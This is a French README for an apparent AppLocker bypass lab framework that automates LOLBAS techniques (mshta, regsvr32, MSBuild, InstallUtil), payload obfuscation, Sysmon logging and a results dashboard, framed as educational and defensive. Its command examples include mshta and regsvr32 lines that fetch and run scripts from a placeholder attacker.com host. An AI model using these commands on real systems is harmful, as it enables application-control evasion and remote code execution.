# 🛡️ AppLocker Bypass Lab - Framework Complet

## ⚠️ AVERTISSEMENT LÉGAL ET ÉTHIQUE

```
CE FRAMEWORK EST DESTINÉ EXCLUSIVEMENT À DES FINS ÉDUCATIVES ET DÉFENSIVES.

✅ Usages Autorisés:
   • Formation en cybersécurité
   • Recherche académique
   • Tests de sécurité dans des environnements contrôlés
   • Évaluation de configurations AppLocker
   • Tests sur vos propres systèmes ou avec autorisation explicite

❌ Usages Interdits:
   • Tests sur des systèmes sans autorisation
   • Activités malveillantes ou illégales
   • Contournement de mesures de sécurité à des fins non autorisées

L'utilisateur est seul responsable de l'usage de ce framework.
```

---

## 📋 Table des Matières

1. [Vue d'ensemble](#vue-densemble)
2. [Installation](#installation)
3. [Architecture](#architecture)
4. [Modules Disponibles](#modules-disponibles)
5. [Guide d'Utilisation](#guide-dutilisation)
6. [Techniques LOLBAS](#techniques-lolbas)
7. [Mapping MITRE ATT&CK](#mapping-mitre-attck)
8. [Dashboard Web](#dashboard-web)
9. [Gestion de Campagnes](#gestion-de-campagnes)
10. [Troubleshooting](#troubleshooting)

---

## 🎯 Vue d'ensemble

Framework d'automatisation pour l'analyse et la compréhension des techniques de bypass AppLocker utilisant des binaires Windows légitimes (LOLBAS - Living Off The Land Binaries and Scripts).

### Objectifs Pédagogiques

- **Comprendre** les mécanismes de contournement AppLocker
- **Analyser** les comportements des binaires Windows natifs
- **Détecter** les tentatives de bypass via Sysmon
- **Tester** la robustesse des configurations de sécurité
- **Documenter** les techniques MITRE ATT&CK applicables

### Fonctionnalités Principales

✅ **12+ techniques LOLBAS** documentées et automatisées  
✅ **Obfuscation pédagogique** (Base64, XOR, GZIP, concaténation)  
✅ **Packaging natif** (CSC.exe, InstallUtil, MSBuild)  
✅ **Dashboard Web** Flask avec statistiques en temps réel  
✅ **Gestion de campagnes** avec scoring automatique  
✅ **Mapping MITRE ATT&CK** complet  
✅ **Logs Sysmon** et AppLocker intégrés  

---

## 🚀 Installation

### Prérequis

```bash
# Windows 10/11 (VM recommandée)
# Python 3.8+
# PowerShell 5.1+
# VMware Workstation (optionnel pour snapshots)
```

### Installation des Dépendances

```bash
# Cloner le repository
git clone https://github.com/your-repo/AppLockerBypassLab
cd AppLockerBypassLab

# Installer les dépendances Python
pip install -r requirements.txt

# Contenu de requirements.txt:
flask
requests
```

### Configuration de l'Environnement Lab

```powershell
# Installer Sysmon (configuration recommandée: SwiftOnSecurity)
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip
.\Sysmon\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Activer AppLocker (mode Audit pour tests)
Set-AppLockerPolicy -XMLPolicy applocker_policy.xml
```

---

## 📁 Architecture

```
AppLockerBypassLab/
├─ payloads/                    # Payloads générés
│  ├─ mshta/
│  ├─ regsvr32/
│  ├─ rundll32/
│  ├─ installutil/
│  ├─ msbuild/
│  ├─ obfuscated/              # Payloads obfusqués
│  ├─ packaged/                # Payloads packageés
│  └─ generated/
├─ scripts/                    # Scripts d'automatisation
│  ├─ download_payloads.py     # Téléchargement depuis GitHub
│  ├─ generate_payloads.py     # Génération de payloads
│  ├─ obfuscate_payloads.py    # Module d'obfuscation
│  ├─ package_payloads.py      # Packaging (EXE, DLL, SCT)
│  ├─ execute_payloads.ps1     # Exécution automatique
│  ├─ collect_logs.ps1         # Collection de logs
│  ├─ analyze_results.py       # Analyse des événements
│  ├─ mitre_techniques.py      # Catalogue MITRE
│  ├─ campaign_manager.py      # Gestion de campagnes
│  └─ dashboard.py             # Interface Web
├─ lab_vm/                     # VM de test
│  └─ snapshot.vmx
├─ logs/                       # Logs collectés
│  ├─ sysmon/
│  └─ applocker/
├─ campaigns/                  # Campagnes de tests
├─ lab_results.db             # Base de données SQLite
└─ README.md
```

---

## 🧩 Modules Disponibles

### 1. Téléchargement de Payloads

```bash
python scripts/download_payloads.py
```

Télécharge automatiquement des payloads LOLBAS depuis:
- LOLBAS Project (GitHub)
- Empire Framework
- Atomic Red Team

### 2. Génération de Payloads

```bash
python scripts/generate_payloads.py
```

Génère des payloads personnalisés:
- HTA (mshta.exe)
- SCT (regsvr32.exe)
- XML (MSBuild.exe)
- BAT, PS1, VBS

### 3. Obfuscation

```bash
python scripts/obfuscate_payloads.py
```

Techniques disponibles:
- ✅ Base64 simple/multicouche
- ✅ Compression GZIP + Base64
- ✅ Concaténation de chaînes
- ✅ Renommage de variables
- ✅ XOR encoding
- ✅ String reversal

### 4. Packaging

```bash
python scripts/package_payloads.py
```

Formats supportés:
- ✅ EXE (via csc.exe)
- ✅ DLL .NET (InstallUtil.exe)
- ✅ SCT (regsvr32.exe)
- ✅ HTA (mshta.exe)
- ✅ XML (MSBuild.exe)
- ✅ BAT wrapper

### 5. Exécution Automatique

```powershell
.\scripts\execute_payloads.ps1
```

Fonctionnalités:
- Snapshots VM avant chaque test
- Exécution séquentielle
- Collection automatique de logs
- Restauration snapshot après test

### 6. Dashboard Web

```bash
python scripts/dashboard.py
# Accès: http://localhost:5000
```

Interface complète:
- 📊 Statistiques en temps réel
- 📈 Taux de bypass
- 📋 Historique des tests
- 🎯 Catalogue LOLBAS interactif

### 7. Gestion de Campagnes

```bash
# Créer une campagne
python scripts/campaign_manager.py new "Test Q4 2024" "Campagne trimestrielle"

# Lancer une campagne
python scripts/campaign_manager.py run 1

# Voir le scorecard
python scripts/campaign_manager.py score 1

# Exporter le rapport
python scripts/campaign_manager.py export 1

# Lister toutes les campagnes
python scripts/campaign_manager.py list
```

---

## 🎯 Techniques LOLBAS

### Catalogue Complet

| Binaire | MITRE ATT&CK | Bypass AppLocker | Détails |
|---------|--------------|------------------|---------|
| **mshta.exe** | T1218.005 | ✅ | HTML Application, VBScript/JScript inline |
| **regsvr32.exe** | T1218.010 | ✅ | SCT scripts, COM object execution |
| **rundll32.exe** | T1218.011 | ✅ | DLL proxy execution, JavaScript |
| **MSBuild.exe** | T1127.001 | ✅ | XML project inline C# |
| **InstallUtil.exe** | T1218.004 | ✅ | .NET DLL execution |
| **wmic.exe** | T1047 | ✅ | XSL execution, process creation |
| **cscript.exe** | T1059.005 | ✅ | VBScript execution |
| **wscript.exe** | T1059.007 | ✅ | JavaScript execution |
| **pubprn.vbs** | T1216.001 | ✅ | Script proxy execution |
| **mavinject.exe** | T1055.001 | ✅ | DLL injection |
| **cmstp.exe** | T1218.003 | ✅ | INF file execution |
| **hh.exe** | T1218.001 | ✅ | Compiled HTML Help |

### Exemples de Commandes

#### 1. MSHTA.exe

```bash
# Exécution locale
mshta.exe payload.hta

# Exécution distante
mshta.exe http://attacker.com/payload.hta

# Inline VBScript
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell...""")
```

#### 2. REGSVR32.exe

```bash
# SCT script distant
regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll

# SCT script local
regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
```

#### 3. MSBuild.exe

```bash
# Exécuter un XML malveillant
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

#### 4. InstallUtil.exe

```bash
# Exécuter une DLL .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

---

## 🗺️ Mapping MITRE ATT&CK

### Génération du Mapping

```bash
python scripts/mitre_techniques.py
```

**Sorties générées:**
- `mitre_techniques.json` - Export JSON complet
- `MITRE_TECHNIQUES.md` - Documentation Markdown

### Tactiques Couvertes

| Tactique | Techniques | Couverture |
|----------|-----------|------------|
| **Execution** (TA0002) | T1059.001, T1059.003, T1059.005, T1047 | 100% |
| **Defense Evasion** (TA0005) | T1218.*, T1127.001, T1216.001 | 100% |
| **Privilege Escalation** (TA0004) | T1055.001 | Partiel |

### Recherche par Outil

```python
from scripts.mitre_techniques import MitreMapper

mapper = MitreMapper()
results = mapper.get_by_tool("mshta.exe")
print(results)
```

---

## 🌐 Dashboard Web

### Fonctionnalités

#### Statistiques en Temps Réel

- **Bypasses réussis** - Nombre de contournements
- **Bloqués** - Tentatives détectées
- **Tests totaux** - Volume de tests
- **Taux de succès** - Pourcentage de bypass

#### Interface Principale

1. **Tableau de bord**
   - Statistiques globales
   - Graphiques de tendances
   - Derniers résultats

2. **Contrôles**
   - ▶️ Lancer tests
   - 🔧 Générer payloads
   - 🔄 Actualiser
   - 🗑️ Effacer résultats

3. **Historique**
   - Date/heure d'exécution
   - Payload utilisé
   - Technique LOLBAS
   - Statut (bypass/blocked)
   - Événements Sysmon
   - Notes

4. **Catalogue LOLBAS**
   - Liste interactive des techniques
   - Documentation intégrée
   - Exemples de commandes

### Lancement

```bash
python scripts/dashboard.py

# Accès: http://localhost:5000
# Mode debug activé par défaut
```

### API REST

```bash
# GET /api/results - Récupérer tous les résultats
curl http://localhost:5000/api/results

# POST /api/run_tests - Lancer une campagne
curl -X POST http://localhost:5000/api/run_tests

# POST /api/add_result - Ajouter un résultat manuel
curl -X POST -H "Content-Type: application/json" \
  -d '{"payload_name":"test.hta","technique":"mshta","status":"bypass"}' \
  http://localhost:5000/api/add_result
```

---

## 📊 Gestion de Campagnes

### Workflow Complet

```bash
# 1. Créer une campagne
python scripts/campaign_manager.py new "Test Mensuel Novembre" "Tests de routine"
# Output: Campaign ID: 1

# 2. Lancer la campagne
python scripts/campaign_manager.py run 1
# Exécution automatique de tous les payloads

# 3. Analyser les résultats
python scripts/campaign_manager.py score 1

# 4. Exporter le rapport
python scripts/campaign_manager.py export 1
# Output: campaigns/campaign_1_report.json
```

### Format du Scorecard

```
======================================================================
📊 SCORECARD - Campagne 1
======================================================================
Technique       Total    Bypass   Taux       Temps      Events
----------------------------------------------------------------------
mshta           10       8        80.0%      1.23s      15.4
regsvr32        8        6        75.0%      1.45s      18.2
rundll32        7        5        71.4%      1.67s      22.1
msbuild         5        4        80.0%      2.01s      12.5
installutil     6        5        83.3%      1.89s      14.8
======================================================================
```

### Base de Données SQLite

Structure:

```sql
-- Campagnes
CREATE TABLE campaigns (
    id INTEGER PRIMARY KEY,
    name TEXT,
    description TEXT,
    start_time TEXT,
    end_time TEXT,
    status TEXT,
    total_tests INTEGER,
    bypasses INTEGER,
    blocked INTEGER
);

-- Résultats
CREATE TABLE test_results (
    id INTEGER PRIMARY KEY,
    campaign_id INTEGER,
    timestamp TEXT,
    payload_name TEXT,
    technique TEXT,
    status TEXT,
    applocker_blocked INTEGER,
    sysmon_events INTEGER,
    execution_time REAL,
    notes TEXT
);
```

---

## 🔍 Analyse des Logs

### Collection Sysmon

```powershell
# Collection manuelle
.\scripts\collect_logs.ps1 -Payload "test.hta"

# Fichiers générés:
# logs/20241122_143022-test.hta/sysmon.evtx
# logs/20241122_143022-test.hta/applocker.evtx
```

### Analyse Automatique

```bash
python scripts/analyze_results.py
```

Événements Sysmon pertinents:
- **Event ID 1** - Process Creation
- **Event ID 3** - Network Connection
- **Event ID 7** - Image Loaded (DLL)
- **Event ID 10** - Process Access
- **Event ID 11** - File Created

### Détection de Bypasses

Indicateurs clés:
- Exécution de binaires signés Microsoft
- Chaînes de commande anormales
- Téléchargements depuis Internet
- Création de processus enfants suspects

---

## 🛠️ Troubleshooting

### Problème: Payloads non générés

```bash
# Vérifier les permissions
icacls payloads /grant Everyone:F

# Regénérer
python scripts/generate_payloads.py
```

### Problème: Dashboard ne démarre pas

```bash
# Vérifier Flask
pip install --upgrade flask

# Vérifier le port 5000
netstat -ano | findstr :5000

# Utiliser un port alternatif
# Modifier dashboard.py: app.run(port=8080)
```

### Problème: VM ne prend pas de snapshot

```bash
# Vérifier VMware Tools
vmrun list

# Installer VMware Tools dans la VM
# Redémarrer la VM
```

### Problème: AppLocker bloque tout

```powershell
# Passer en mode Audit
Get-AppLockerPolicy -Effective -Xml | Set-AppLockerPolicy

# Vérifier la configuration
Get-AppLockerPolicy -Effective
```

---

## 📚 Ressources Supplémentaires

### Documentation Officielle

- **LOLBAS Project**: https://lolbas-project.github.io/
- **MITRE ATT&CK**: https://attack.mitre.org/
- **Sysmon**: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
- **AppLocker**: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/

### Références Académiques

- "Ultimate AppLocker Bypass List" - @api0cradle
- "Living Off The Land Binaries and Scripts" - LOLBAS Contributors
- "Windows Signed Binary Proxy Execution" - MITRE ATT&CK

### Communauté

- **GitHub Issues**: Pour rapporter des bugs
- **Pull Requests**: Contributions bienvenues
- **Twitter**: Suivre @LOLBAS_Project

---

## 📜 Licence

```
MIT License - Usage Éducatif et Défensif Uniquement

Copyright (c) 2024

Permission accordée à des fins pédagogiques, recherche en sécurité,
et tests autorisés uniquement.

L'utilisation malveillante est strictement interdite.
```

---

## 🙏 Remerciements

- **LOLBAS Project** - Catalogue de binaires
- **MITRE Corporation** - Framework ATT&CK
- **SwiftOnSecurity** - Configuration Sysmon
- **Communauté InfoSec** - Contributions et recherches

---

## ⚠️ Rappel Final

**CE FRAMEWORK EST DESTINÉ À L'ÉDUCATION ET À LA DÉFENSE UNIQUEMENT.**

Avant toute utilisation:
1. ✅ Assurez-vous d'avoir l'autorisation explicite
2. ✅ Utilisez uniquement dans des environnements de test isolés
3. ✅ Documentez toutes les activités
4. ✅ Respectez les lois locales et internationales

**L'ignorance de ces règles n'est pas une excuse légale.**

---

*Dernière mise à jour: Novembre 2024*